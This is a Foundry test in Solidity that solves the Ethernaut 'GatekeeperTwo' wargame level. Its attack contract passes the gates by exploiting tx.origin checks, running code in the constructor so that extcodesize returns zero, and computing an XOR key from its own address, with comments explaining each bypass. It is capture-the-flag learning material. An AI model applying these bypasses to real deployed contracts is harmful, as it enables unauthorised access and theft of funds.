// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/14-GatekeeperTwo/GatekeeperTwoFactory.sol";
import "../src/Ethernaut.sol";

interface IGatekeeperTwo {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract UnlockTwo {
    IGatekeeperTwo gatekeeper;

    constructor(address _gatekeeperTwo) {
        /*Calling the function through this contract already passes Gate 1 as
          tx.origin != msg.sender

        Gate 2 requires the caller to have a contract size of zero.
        The extcodesize returns the size of the code in the given address,
        which is caller for this case.
        Contracts have code, and user accounts do not.
        To have 0 code size, you must be an account.
        A way to bypass this will be to run all the code in the constructor
        of this contract. This way, when it is checked it does not have size yet.

        Gate 3 key: The address of the contract XOR with key = -1.
        uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) = -1
        So we make it be the missing part for the XOR to work
        */
        gatekeeper = IGatekeeperTwo(_gatekeeperTwo);
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        gatekeeper.enter(key);
    }
}

contract GatekeeperTwoTest is Test {
    Ethernaut ethernaut;

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(tx.origin, 1 ether);
    }

    function testGatekeeperTwo() public {
        // Level Setup
        GatekeeperTwoFactory gatekeeperTwoFactory = new GatekeeperTwoFactory();
        ethernaut.registerLevel(gatekeeperTwoFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(gatekeeperTwoFactory);
        GatekeeperTwo ethernautGatekeeperTwo = GatekeeperTwo(payable(levelAddress));

        // Level Attack
        bytes8 key = bytes8(0);
        emit log_named_bytes32("Key", bytes32(key));
        UnlockTwo attack = new UnlockTwo(levelAddress);

        // Level Submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
